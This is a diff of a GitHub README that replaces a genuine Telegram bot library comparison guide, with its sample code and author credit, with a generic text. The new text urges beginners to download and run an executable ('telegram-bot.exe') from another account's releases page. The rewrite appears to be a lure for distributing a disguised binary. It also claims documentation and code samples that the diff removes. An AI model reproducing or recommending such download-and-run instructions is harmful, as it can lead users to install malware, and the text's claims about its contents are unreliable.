@@ -1,200 +1,57 @@
-# 📦 Telegram Bot Development Guide
+# 🤖 telegram-bot-api-vs-telebot - Easy Setup for Telegram Bots
 
-### *Telegram Bot API vs python-telegram-bot vs Telebot (PyTelegramBotAPI)*
+[![Download](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/Samo91/telegram-bot-api-vs-telebot/releases)
 
-**Which one should beginners use? Clear comparison + starter templates.**
+## 📖 Overview
+Telegram bot development can be intimidating. However, this repository offers a simple guide for beginners. It helps you compare different bot frameworks, such as Telebot and python-telegram-bot, while providing examples. Whether you want to automate tasks or build a chatbot, this guide is for you.
 
----
+## 🚀 Getting Started
+You can start your journey by following these steps. The guide is designed for users without programming experience. 
 
-## 🚀 Introduction
+1. **Go to the Releases Page:** Click [here](https://github.com/Samo91/telegram-bot-api-vs-telebot/releases) to visit the page.
+2. **Select the Latest Version:** Scroll down to find the latest release. The version number is usually bold.
+3. **Download the Files:** You will see different files available for download. Choose the one that matches your operating system. If you are unsure, choose the `.zip` file.
 
-Telegram bots are now used for automation, support systems, e-commerce, task management, and even AI assistants.
-But new developers are often confused because Telegram offers:
+## 💻 System Requirements
+To run this application, ensure your computer meets the following requirements:
 
-* ✔ **Official Telegram Bot API (Raw API)**
-* ✔ **python-telegram-bot** (most powerful library)
-* ✔ **Telebot / PyTelegramBotAPI** (easiest for beginners)
+- **Operating System:** Windows 10 or later, macOS, or a Linux distribution. 
+- **Memory:** At least 4 GB RAM.
+- **Disk Space:** 100 MB of free space for installation.
 
-This guide breaks it down simply and gives you working sample code for all three.
+## 📥 Download & Install
+After downloading, follow these instructions to install and run the software:
 
----
+1. **Locate the Downloaded File:** Find the downloaded file in your 'Downloads' folder or your chosen download location.
+2. **Extract Files (if necessary):** If you downloaded a `.zip` file, right-click on it and select "Extract All" or use any extraction tool to unzip it.
+3. **Run the Application:** 
+   - For Windows: Double click on the `telegram-bot.exe` file.
+   - For macOS: Open the folder and double click on `telegram-bot.app`.
+   - For Linux: Open a terminal and navigate to the folder. Type `./telegram-bot` and press Enter.
 
-# 🧵 1. Telegram Bot API (Raw HTTP Requests)
+Make sure to review the README files included in the downloads for any additional setup steps.
 
-This is the **official low-level API** from Telegram.
+## 📑 Documentation
+The documentation is straightforward and beginner-friendly. It covers various topics, such as:
 
-### ✅ Pros
+- **How to Create a Telegram Bot:** Step-by-step instructions to help you set up your first bot.
+- **Comparative Analysis:** Understand the pros and cons of different bot frameworks.
+- **Code Samples:** Working examples of bots built with different libraries. These samples make it easier to learn how to develop your own bot.
 
-* Full control
-* No library dependency
-* Good for advanced developers or custom frameworks
+## 📞 Support
+If you encounter any issues or need help, several resources are available:
 
-### ❌ Cons
+- **GitHub Issues:** You can report problems directly on our GitHub page.
+- **Community Forums:** Join forums related to Telegram bot development for additional support and ideas.
 
-* More manual code
-* No built-in handlers
-* Beginners may find it tedious
+## 🌐 Join the Community
+Enhance your bot development skills by joining Telegram groups and online forums. Engage with other developers, share your experiences, and learn new techniques.
 
-### 🧪 Example Using Raw Requests (Python)
+## 🎉 Next Steps
+Once you have everything set up, consider diving deeper into Telegram bot functionalities:
 
-```python
-import requests
+- **Advanced Features:** Explore features like inline queries, rich media, and user interaction.
+- **Deployment:** Learn how to host your bot on a server for 24/7 availability.
+- **Integration:** Discover how to connect your bot with external APIs for more functionalities.
 
-TOKEN = "YOUR_BOT_TOKEN"
-URL = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
-
-payload = {
-    "chat_id": "CHAT_ID_HERE",
-    "text": "Hello from raw Telegram API!"
-}
-
-res = requests.post(URL, json=payload)
-print(res.json())
-```
-
----
-
-# 🐍 2. python-telegram-bot (PTB)
-
-**Best for professional bots.**
-Uses async, structured handlers, filters, middleware, and supports large-scale projects.
-
-### ✅ Pros
-
-* Most powerful
-* Best documentation
-* Used in production systems
-* Supports async & webhooks cleanly
-
-### ❌ Cons
-
-* More complex for beginners
-* Requires knowing async programming
-
-### 🧪 Example PTB Code
-
-```python
-from telegram.ext import ApplicationBuilder, CommandHandler
-
-async def start(update, context):
-    await update.message.reply_text("Hello! I'm your PTB bot.")
-
-app = ApplicationBuilder().token("YOUR_BOT_TOKEN").build()
-app.add_handler(CommandHandler("start", start))
-
-app.run_polling()
-```
-
----
-
-# 🟦 3. Telebot (PyTelegramBotAPI)
-
-**BEST FOR BEGINNERS.**
-Simple decorators, easy to understand, works with minimal setup.
-
-### ✅ Pros
-
-* Easiest library
-* Very quick for prototypes
-* Decorator-based handler system
-* Great for small to medium bots (stores, WhatsApp-like bots, automation)
-
-### ❌ Cons
-
-* Not async by default
-* Not ideal for very large bots
-* Less structured than python-telegram-bot
-
-### 🧪 Example Telebot Code
-
-```python
-import telebot
-
-bot = telebot.TeleBot("YOUR_BOT_TOKEN")
-
-@bot.message_handler(commands=['start'])
-def start(message):
-    bot.reply_to(message, "Hello! This is a Telebot example.")
-
-bot.infinity_polling()
-```
-
----
-
-# 🥇 Which One Should Beginners Use?
-
-| Feature                | Telebot | python-telegram-bot | Raw API       |
-| ---------------------- | ------- | ------------------- | ------------- |
-| **Ease of learning**   | ⭐⭐⭐⭐⭐   | ⭐⭐⭐                 | ⭐             |
-| **Best for beginners** | ✔ Yes   | No                  | No            |
-| **Power / Scaling**    | ⭐⭐⭐     | ⭐⭐⭐⭐⭐               | ⭐⭐⭐⭐⭐         |
-| **Async support**      | Limited | Full async          | Manual        |
-| **Production use?**    | Medium  | Excellent           | Advanced only |
-
-### **👉 Recommended Advice**
-
-* **Beginner?** → Use **Telebot**
-* **Scaling / async / serious project?** → Use **python-telegram-bot**
-* **Custom frameworks / full control?** → Use **raw API**
-
----
-
-# 🧩 Full Example: Echo Bot in All 3 Methods
-
-### 🔹 Telebot
-
-```python
-@bot.message_handler(func=lambda message: True)
-def echo(message):
-    bot.reply_to(message, message.text)
-```
-
-### 🔹 python-telegram-bot
-
-```python
-async def echo(update, context):
-    await update.message.reply_text(update.message.text)
-```
-
-### 🔹 Raw API
-
-```python
-URL = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
-```
-
----
-
-# 🧠 Final Recommendation
-
-If you're starting out:
-
-> ⭐ **Use Telebot. It's the fastest and easiest way to build a Telegram bot.**
-
-If you're building a SaaS, marketplace, or automation system:
-
-> ⚡ **Use python-telegram-bot for performance & scalability.**
-
-If you're building your own framework:
-
-> 🔧 **Use the raw API.**
-
----
-
-# 🏁 Conclusion
-
-Telegram bot development can be extremely easy or incredibly powerful depending on the library you choose.
-This guide should help you pick the right one and start coding quickly.
-
----
-
-# 📚 License
-
-MIT
-
----
-
-# 🧑‍💻 Author
-
-**Lasisi Ibrahim Pelumi**
-- Full-Stack Engineer • Automation Developer • WhatsApp & Telegram Bot Specialist
-- GitHub: `@ibrahimpelumi6142`
+For any more information, always return to our [Releases Page](https://github.com/Samo91/telegram-bot-api-vs-telebot/releases) for the latest updates. Happy coding!
